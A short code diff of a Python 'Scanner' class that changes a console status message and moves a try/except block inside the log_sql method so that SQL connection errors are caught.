@@ -85,7 +85,7 @@ class Scanner:
             if self.report_method == "file":
                 #self.report_to_file()
                 # if you don't want to print in the console, comment below line
-                print(f"[{self.filename}] - Logging...")
+                print(f"[{self.filename}] - Waiting for Input...")
             self.start_dt = datetime.now()
         
         ###log to SQL###
@@ -100,8 +100,9 @@ class Scanner:
         timer.daemon = True
         # start the timer
         timer.start()
-    try:
-        def log_sql(self):
+    
+    def log_sql(self):
+        try:
             
             string = self.log
             stringSplit = string.split(",")
@@ -138,8 +139,8 @@ class Scanner:
             print(f'LOGGED TO SQL at {datetime.now()}')
 
         
-    except(InterfaceError):
-        print('ERROR CONNECTING TO SQL, PLEASE REBOOT SYSTEM')
+        except(InterfaceError):
+            print('ERROR CONNECTING TO SQL, PLEASE REBOOT SYSTEM')
         
 
     def start(self):
